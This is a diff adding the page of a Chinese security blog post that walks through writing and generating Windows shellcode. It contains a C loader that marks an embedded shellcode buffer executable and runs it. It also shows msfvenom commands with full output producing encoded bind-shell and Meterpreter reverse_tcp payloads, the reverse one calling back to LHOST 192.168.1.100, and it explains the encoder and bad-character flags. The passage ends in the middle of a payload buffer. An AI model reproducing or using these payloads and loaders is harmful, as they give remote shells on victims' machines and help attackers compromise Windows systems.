@@ -1,0 +1,1265 @@
+
+<!doctype html>
+<html class="theme-next use-motion theme-next-mala">
+<head><meta name="generator" content="Hexo 3.9.0">
+  
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5">
+
+
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.5.1">
+
+
+    <meta name="description" content="kali|linux|sec|Web|MSF|Win">
+
+
+
+  <meta name="keywords" content="Metasploit,">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Demonsec" type="application/atom+xml">
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1">
+
+
+<meta name="keywords" content="Metasploit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017">
+<meta property="og:url" content="www.ggsec.cn/secist-shellcode.html">
+<meta property="og:site_name" content="Demonsec">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/install-openvas-for-broad-vulnerability-assessment.1280x600.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505477898281.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505478268488.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/91D81B3717235DAA0518E2443145D3D2.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482728515.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482827337.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484222188.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484635934.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485668396.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485903488.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505485863927.jpg">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/CACE2616E540CCD26C7E328C258F10AA.png">
+<meta property="og:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505486902561.jpg">
+<meta property="og:updated_time" content="2018-12-21T06:56:35.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017">
+<meta name="twitter:image" content="https://demonsec666.oss-cn-qingdao.aliyuncs.com/install-openvas-for-broad-vulnerability-assessment.1280x600.jpg">
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mala',
+    sidebar: 'post'
+  };
+</script>
+
+  <title> 我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017 | Demonsec </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+  
+
+
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand" rel="start">
+      <span class="logo">
+        <i class="icon-next-logo"></i>
+      </span>
+      <span class="site-title">Demonsec’S blog</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            <i class="menu-item-icon icon-next-home"></i> <br>
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            <i class="menu-item-icon icon-next-archives"></i> <br>
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            <i class="menu-item-icon icon-next-tags"></i> <br>
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-linux">
+          <a href="/categories/linux" rel="section">
+            <i class="menu-item-icon icon-next-linux"></i> <br>
+            linux
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-windows">
+          <a href="/categories/windows" rel="section">
+            <i class="menu-item-icon icon-next-windows"></i> <br>
+            windows
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-haking">
+          <a href="/categories/haking" rel="section">
+            <i class="menu-item-icon icon-next-haking"></i> <br>
+            haking
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-web">
+          <a href="/categories/web" rel="section">
+            <i class="menu-item-icon icon-next-web"></i> <br>
+            web
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-msf">
+          <a href="/categories/Metasploit" rel="section">
+            <i class="menu-item-icon icon-next-msf"></i> <br>
+            Metasploit
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-kali">
+          <a href="/categories/kali" rel="section">
+            <i class="menu-item-icon icon-next-kali"></i> <br>
+            kali
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tea">
+          <a href="/categories/tea" rel="section">
+            <i class="menu-item-icon icon-next-tea"></i> <br>
+            tea
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-黑苹果">
+          <a href="/categories/mac" rel="section">
+            <i class="menu-item-icon icon-next-黑苹果"></i> <br>
+            mac
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-逆向">
+          <a href="/categories/逆向" rel="section">
+            <i class="menu-item-icon icon-next-逆向"></i> <br>
+            逆向
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-music">
+          <a href="/music" rel="section">
+            <i class="menu-item-icon icon-next-music"></i> <br>
+            music
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-每日安全干货及动态">
+          <a href="/categories/每日安全干货及动态" rel="section">
+            <i class="menu-item-icon icon-next-每日安全干货及动态"></i> <br>
+            每日安全干货及动态
+          </a>
+        </li>
+      
+
+      
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+    </header>
+
+    
+      
+
+      
+        <style type="text/css">
+
+    .circle {
+        width: 40px;
+        height: 40px;
+        background: #555 no-repeat;
+        cursor: move;
+    }
+
+    .assist-btn {
+        position: fixed;
+        top: 50％;
+        left: 10px;
+        -moz-border-radius: 50px;
+        -webkit-border-radius: 50px;
+        border-radius: 50px;
+        outline: none;
+        border: none;
+        color: #87daff;
+    }
+
+</style>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+<script type="text/javascript">
+    // 浮动圆点展开与收缩
+    /*
+    $(function () {
+        var assist_box = $('.assist-box');
+        $('#assist_btn').hover(function () {
+            assist_box.stop().show(300);
+        }, function () {
+            assist_box.stop().hide(150);
+        })
+    });
+    */  
+    //浮动圆点拖动
+    $(function () {
+        var box = document.getElementById('assist_btn');
+        box.onmousedown = function (event) {
+            var e = event || window.event,
+                t = e.target || e.srcElement,
+                // 鼠标按下时的坐标x1,y1
+                x1 = e.clientX,
+                y1 = e.clientY,
+                //鼠标按下时的左右偏移量
+                dragLeft = this.offsetLeft,
+                dragTop = this.offsetTop;
+
+            document.onmousemove = function (event) {
+                var e = event || window.event,
+                    t = e.target || e.srcElement,
+                    // 鼠标移动时的动态坐标
+                    x2 = e.clientX,
+                    y2 = e.clientY,
+                    // 鼠标移动时的坐标的变化量
+                    x = x2 - x1,
+                    y = y2 - y1;
+                box.style.left = (dragLeft + x) + 'px';
+                box.style.top = (dragTop + y) + 'px';
+            }
+
+            document.onmouseup = function () {
+                this.onmousemove = null;
+            }
+        }
+    });
+
+/*
+    $whitesmoke   = #f5f5f5
+    $gainsboro    = #eee
+    $gray-lighter = #ddd
+    $grey-light   = #ccc
+    $grey         = #bbb
+    $grey-dark    = #999
+    $grey-dim     = #666
+    $black-light  = #555
+    $black-deep   = #222
+    $red          = #ff2a2a
+    $blue-bright  = #87daff
+    $blue         = #0684bd
+    $blue-deep    = #262a30
+*/
+    // white theme
+    var body = {color: "#555", background: "white"};
+    var a_tag = {color: "#222"};
+    var header = { background: "#f5f5f5"};
+    var logo_line_i = {background: "#222"};
+    // var post_code = {background: "#eee", color: "#222"};
+
+    function switch_theme() {
+        $("body").css(body);
+        $("a:not('.links-of-author-item a, .site-state-item a, .site-state-posts a, .feed-link a, .motion-element a, .post-tags a, .show-commit-cls a, #donate_board a')").css(a_tag);
+        $(".header, .footer").css(header);
+        $(".logo-line-before i, .logo-line-after i").css(logo_line_i);
+        //$(".post code").css(post_code);
+        $("#idhyt-surprise-ball #idhyt-surprise-ball-animation .drag").css(a_tag);
+        $(".post-title-link, .posts-expand .post-meta, .post-comments-count, .disqus-comment-count, .post-category a, .post-nav-next a, .post-nav-item a").css(a_tag);
+        
+        // $("code").css({color: '#c5c8c6', background: '#1d1f21'});
+        $("#assist_btn").hide(1500);
+    }
+
+    $(function () {
+        $("#assist_btn").dblclick(function() {
+            switch_theme();
+        });
+    });
+
+</script>
+
+<div>
+
+    <button class="assist-btn circle" id="assist_btn" title="双击切换">
+        亮
+    </button>
+
+</div>
+
+
+
+
+
+
+
+
+
+      
+
+    
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content"> 
+
+  <div id="posts" class="posts-expand">
+    
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              我的shellcode编写之路 | MSF| Shellcode  | kali linux 2017
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2017-09-15T20:36:20+08:00" content="2017-09-15">
+            2017-09-15
+          </time>
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/Metasploit/" itemprop="url" rel="index">
+                  <span itemprop="name">Metasploit</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <!--
+              <a href="/secist-shellcode.html#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="secist-shellcode.html" itemprop="commentsCount"></span>
+              </a>
+              -->
+              <a href="/secist-shellcode.html#comments" itemprop="discussionUrl">
+                <span>评论</span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <span itemprop="articleBody"><p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/install-openvas-for-broad-vulnerability-assessment.1280x600.jpg" alt="enter description here"><br><a id="more"></a></p>
+<h2 id="视频演示："><a href="#视频演示：" class="headerlink" title="视频演示："></a>视频演示：</h2><p><div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div></p>
+<script type="text/javascript" src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
+<script>
+    var ivaInstance = new Iva('ivaLive', {
+        appkey: 'By9WGzBIx', //应用标示
+        video: 'https://demonsec666.oss-cn-qingdao.aliyuncs.com/secist-shellcode.mp4', //视频
+        title: 'test', //视频标题，后台视频管理中的标题
+        cover: '' //视频封面，只有在autoplay:false才可生效
+    });
+</script>
+<script src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>
+
+<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=27630183&auto=0&height=66"></iframe>
+
+<h2 id="1-我有一个大胆的想法"><a href="#1-我有一个大胆的想法" class="headerlink" title="1.我有一个大胆的想法"></a>1.我有一个大胆的想法</h2><p>其实shellcode的这篇的灵感也是在与和车王两人的沟通，在他的带领下 也是才知道<a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a>  原来也有shellcode的一篇新的视角，也是在第二天的时间，也是偷偷的趁着上班的空余时间 研究了一下，上帝第一视角。也是蛮有意思的事情。在shellcode中包含了很多平台的shellcode。<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505477898281.jpg" alt="enter description here"></p>
+<h2 id="2-无心插柳柳成荫"><a href="#2-无心插柳柳成荫" class="headerlink" title="2.无心插柳柳成荫"></a>2.无心插柳柳成荫</h2><p>当我无意间浏览到某篇文章后，已经吸引了我的注意力了<br><a href="https://www.exploit-db.com/exploits/37758/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/37758/</a><br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505478268488.jpg" alt="enter description here"></p>
+<h2 id="3-shellcode-弹窗hellword-警告窗口"><a href="#3-shellcode-弹窗hellword-警告窗口" class="headerlink" title="3.shellcode 弹窗hellword 警告窗口"></a>3.shellcode 弹窗hellword 警告窗口</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="section"># include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="section"># include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="section"># include &lt;string.h&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="section"># include &lt;windows.h&gt;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">int</span><br><span class="line">main(void)</span><br><span class="line">&#123;</span><br><span class="line">  char *shellcode = "\x33\xc9\x64\x8b\x49\x30\x8b\x49\x0c\x8b"</span><br><span class="line"><span class="code">    "\x49\x1c\x8b\x59\x08\x8b\x41\x20\x8b\x09"</span></span><br><span class="line"><span class="code">    "\x80\x78\x0c\x33\x75\xf2\x8b\xeb\x03\x6d"</span></span><br><span class="line"><span class="code">    "\x3c\x8b\x6d\x78\x03\xeb\x8b\x45\x20\x03"</span></span><br><span class="line"><span class="code">    "\xc3\x33\xd2\x8b\x34\x90\x03\xf3\x42\x81"</span></span><br><span class="line"><span class="code">    "\x3e\x47\x65\x74\x50\x75\xf2\x81\x7e\x04"</span></span><br><span class="line"><span class="code">    "\x72\x6f\x63\x41\x75\xe9\x8b\x75\x24\x03"</span></span><br><span class="line"><span class="code">    "\xf3\x66\x8b\x14\x56\x8b\x75\x1c\x03\xf3"</span></span><br><span class="line"><span class="code">    "\x8b\x74\x96\xfc\x03\xf3\x33\xff\x57\x68"</span></span><br><span class="line"><span class="code">    "\x61\x72\x79\x41\x68\x4c\x69\x62\x72\x68"</span></span><br><span class="line"><span class="code">    "\x4c\x6f\x61\x64\x54\x53\xff\xd6\x33\xc9"</span></span><br><span class="line"><span class="code">    "\x57\x66\xb9\x33\x32\x51\x68\x75\x73\x65"</span></span><br><span class="line"><span class="code">    "\x72\x54\xff\xd0\x57\x68\x6f\x78\x41\x01"</span></span><br><span class="line"><span class="code">    "\xfe\x4c\x24\x03\x68\x61\x67\x65\x42\x68"</span></span><br><span class="line"><span class="code">    "\x4d\x65\x73\x73\x54\x50\xff\xd6\x57\x68"</span></span><br><span class="line"><span class="code">    "\x72\x6c\x64\x21\x68\x6f\x20\x57\x6f\x68"</span></span><br><span class="line"><span class="code">    "\x48\x65\x6c\x6c\x8b\xcc\x57\x57\x51\x57"</span></span><br><span class="line"><span class="code">    "\xff\xd0\x57\x68\x65\x73\x73\x01\xfe\x4c"</span></span><br><span class="line"><span class="code">    "\x24\x03\x68\x50\x72\x6f\x63\x68\x45\x78"</span></span><br><span class="line"><span class="code">    "\x69\x74\x54\x53\xff\xd6\x57\xff\xd0";</span></span><br><span class="line"> </span><br><span class="line">  DWORD why<span class="emphasis">_must_</span>this_variable;</span><br><span class="line">  BOOL ret = VirtualProtect (shellcode, strlen(shellcode),</span><br><span class="line"><span class="code">    PAGE_EXECUTE_READWRITE, &amp;why_must_this_variable);</span></span><br><span class="line"> </span><br><span class="line">  if (!ret) &#123;</span><br><span class="line"><span class="code">    printf ("VirtualProtect\n");</span></span><br><span class="line"><span class="code">    return EXIT_FAILURE;</span></span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  printf("strlen(shellcode)=%d\n", strlen(shellcode));</span><br><span class="line"> </span><br><span class="line">  ((void (*)(void))shellcode)();</span><br><span class="line"> </span><br><span class="line">  return EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>我们来手动的进行编译一下看看具体的效果如何 是不是和他说的一样 会弹框 （hello word）<br><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/91D81B3717235DAA0518E2443145D3D2.png" alt="enter description here"></p>
+<p>   1.可以看到弹窗的内容是 helloword ，也可以看到代码中并无helloword的字符串以及MessageBox 的调用，也就是相关重点的代码就在于shellcode的硬编码。</p>
+<p>   2.那么这就让我想到了msfvenom的shellcode代码 ，由msfvenom生成的恶意的shellcode的。也就是以c生成shellcode硬编码。相关如何的msfvenom </p>
+<p>   3.也可以在<a href="https://github.com/demonsec666/secist_script" target="_blank" rel="noopener">https://github.com/demonsec666/secist_script</a> 中找到我之前录制的msf课程中的第五课 也有提到过msfvenom的教程 ，亦可以查看官方文档<a href="https://www.offensive-security.com/metasploit-unleashed/msfvenom/" target="_blank" rel="noopener">https://www.offensive-security.com/metasploit-unleashed/msfvenom/</a></p>
+<p>   <img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482728515.jpg" alt="enter description here"></p>
+<h2 id="4-shellcode-msfvenom"><a href="#4-shellcode-msfvenom" class="headerlink" title="4.shellcode_msfvenom"></a>4.shellcode_msfvenom</h2><p>本篇就以/<a href="http://www.offensive-security.com" target="_blank" rel="noopener">www.offensive-security.com</a> 中的msfvenom 教程为例</p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505482827337.jpg" alt="enter description here"></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -a x86 --platform Windows -p windows/shell/bind<span class="emphasis">_tcp -e x86/shikata_</span>ga_nai -b '\x00' -i 3 -f python</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 3 iterations of x86/shikata<span class="emphasis">_ga_</span>nai</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 326 (iteration=0)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 353 (iteration=1)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 380 (iteration=2)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai chosen with final size 380</span><br><span class="line">Payload size: 380 bytes</span><br><span class="line">buf = ""</span><br><span class="line">buf += "\xbb\x78\xd0\x11\xe9\xda\xd8\xd9\x74\x24\xf4\x58\x31"</span><br><span class="line">buf += "\xc9\xb1\x59\x31\x58\x13\x83\xc0\x04\x03\x58\x77\x32"</span><br><span class="line">buf += "\xe4\x53\x15\x11\xea\xff\xc0\x91\x2c\x8b\xd6\xe9\x94"</span><br><span class="line">buf += "\x47\xdf\xa3\x79\x2b\x1c\xc7\x4c\x78\xb2\xcb\xfd\x6e"</span><br><span class="line">buf += "\xc2\x9d\x53\x59\xa6\x37\xc3\x57\x11\xc8\x77\x77\x9e"</span><br><span class="line">buf += "\x6d\xfc\x58\xba\x82\xf9\xc0\x9a\x35\x72\x7d\x01\x9b"</span><br><span class="line">buf += "\xe7\x31\x16\x82\xf6\xe2\x89\x89\x75\x67\xf7\xaa\xae"</span><br><span class="line">buf += "\x73\x88\x3f\xf5\x6d\x3d\x9e\xab\x06\xda\xff\x42\x7a"</span><br><span class="line">buf += "\x63\x6b\x72\x59\xf6\x58\xa5\xfe\x3f\x0b\x41\xa0\xf2"</span><br><span class="line">buf += "\xfe\x2d\xc9\x32\x3d\xd4\x51\xf7\xa7\x56\xf8\x69\x08"</span><br><span class="line">buf += "\x4d\x27\x8a\x2e\x19\x99\x7c\xfc\x63\xfa\x5c\xd5\xa8"</span><br><span class="line">buf += "\x1f\xa8\x9b\x88\xbb\xa5\x3c\x8f\x7f\x38\x45\xd1\x71"</span><br><span class="line">buf += "\x34\x59\x84\xb0\x97\xa0\x99\xcc\xfe\x7f\x37\xe2\x28"</span><br><span class="line">buf += "\xea\x57\x01\xcf\xf8\x1e\x1e\xd8\xd3\x05\x67\x73\xf9"</span><br><span class="line">buf += "\x32\xbb\x76\x8c\x7c\x2f\xf6\x29\x0f\xa5\x36\x2e\x73"</span><br><span class="line">buf += "\xde\x31\xc3\xfe\xae\x49\x64\xd2\x39\xf1\xf2\xc7\xa0"</span><br><span class="line">buf += "\x06\xd3\xf6\x1a\xfe\x0a\xfe\x28\xbe\x1a\x42\x9c\xde"</span><br><span class="line">buf += "\x01\x16\x27\xbd\x29\x1c\xf8\x7d\x47\x2c\x68\x06\x0e"</span><br><span class="line">buf += "\x23\x31\xfe\x7d\x58\xe8\x7b\x76\x4b\xfe\xdb\x17\x51"</span><br><span class="line">buf += "\xfa\xdf\xff\xa1\xbc\xc5\x66\x4b\xea\x23\x86\x47\xb4"</span><br><span class="line">buf += "\xe7\xd5\x71\x77\x2e\x24\x4a\x3d\xb1\x6f\x12\xf2\xb2"</span><br><span class="line">buf += "\xd0\x55\xc9\x23\x2e\xc2\xa5\x73\xb2\xc8\xb7\x7d\x6b"</span><br><span class="line">buf += "\x55\x29\xbc\x26\xdd\xf6\xe3\xf6\x25\xc6\x5c\xad\x9c"</span><br><span class="line">buf += "\x9d\x18\x08\x3b\xbf\xd2\xff\x92\x18\x5f\x48\x9b\xe0"</span><br><span class="line">buf += "\x7b\x03\xa5\x32\x11\x27\x2b\x25\xcd\x44\xdb\xbd\xb9"</span><br><span class="line">buf += "\xcd\x48\xda\x56\x4c\x56\xd5\x04\x87\x48\x3a\x6b\x9c"</span><br><span class="line">buf += "\x2a\x15\x4d\xbc\x0b\x56\x06\xb5\xc9\x46\xd0\xfa\x68"</span><br><span class="line">buf += "\xa6\x76\xe9\x52\x2c\x24\x62\x28\xe1\x1d\x87\xb0\x66"</span><br><span class="line">buf += "\x93\x85\x8f\x87\x0f\xcf\x16\x29\x76\x03\x55\x0c\x0e"</span><br><span class="line">buf += "\x3f\x17\xac"</span><br></pre></td></tr></table></figure>
+<p>可以看到使用msfvenom 自动帮我们生成恶意的shellcode<br>1.其中的-a 代表 的是目标的架构 如：x86</p>
+<p>2.–platform 代表的是一个目标机的平台 如： windows</p>
+<p>3.那么-p 呢  代表的是msf的payload的以及-e 和-b 呢 代表这个 encoder编码器，-b 表示去除硬编码中的0x00代码，因为0x00代表着结束的符号，所以我们不能让他出现0x00这个代码。</p>
+<p>4.最后的 -i 和-f 分别代表的是iterations和format （迭代次数和格式）</p>
+<p>那么我们将其代码重新改改，我们比如需要的功能是meterperter、指定ip和端口、指定shellcode 编码格式如：c或者python等代码</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=攻击者</span><br><span class="line">IP地址  LPORT=攻击者端口  -e x86/shikata<span class="emphasis">_ga_</span>nai -b '\x00' -i 迭代次数  -f  c</span><br></pre></td></tr></table></figure>
+<p>那么简短来说就是<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-p去指定payload为 windows/meterpreter/reverse_tcp</span><br><span class="line">LHOST 和LPORT 指定攻击者ip和端口</span><br><span class="line">-e指定x86/shikata<span class="emphasis">_ga_</span>nai 编码器</span><br><span class="line">-i 指定迭代为如 5次 或10次等</span><br><span class="line">-f 指定输出的格式 如c 代码 、或者python等其他格式的代码 </span><br><span class="line">-f参数可以参考msfvenom的帮助参数 查看-f的支持格式</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://demonsec666.oss-cn-qingdao.aliyuncs.com/1505484222188.jpg" alt="enter description here"></p>
+<h2 id="6-shellcode-c-msf"><a href="#6-shellcode-c-msf" class="headerlink" title="6.shellcode_c_msf"></a>6.shellcode_c_msf</h2><p>最终我们可以得到由msfvenom 生成C的shellcode代码</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse<span class="emphasis">_tcp  LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_</span>ga_nai -b '\x00' -i 4 -f c</span><br><span class="line">Found 1 compatible encoders</span><br><span class="line">Attempting to encode payload with 4 iterations of x86/shikata<span class="emphasis">_ga_</span>nai</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 360 (iteration=0)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 387 (iteration=1)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 414 (iteration=2)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai succeeded with size 441 (iteration=3)</span><br><span class="line">x86/shikata<span class="emphasis">_ga_</span>nai chosen with final size 441</span><br><span class="line">Payload size: 441 bytes</span><br><span class="line">Final size of c file: 1878 bytes</span><br><span class="line">unsigned char buf[] = </span><br><span class="line">"\xd9\xe1\xbf\xc4\xbd\x41\x38\xd9\x74\x24\xf4\x5e\x31\xc9\xb1"</span><br><span class="line">"\x68\x31\x7e\x19\x83\xee\xfc\x03\x7e\x15\x26\x48\x9a\xec\x1c"</span><br><span class="line">"\x99\x40\x70\xdd\x07\x0e\xae\xe9\xe6\xc6\x67\xa0\x76\x28\x2e"</span><br><span class="line">"\xd8\x7b\x1c\xd4\x5f\x95\x5c\x0a\x80\xed\x24\xaf\x55\xee\xe0"</span><br><span 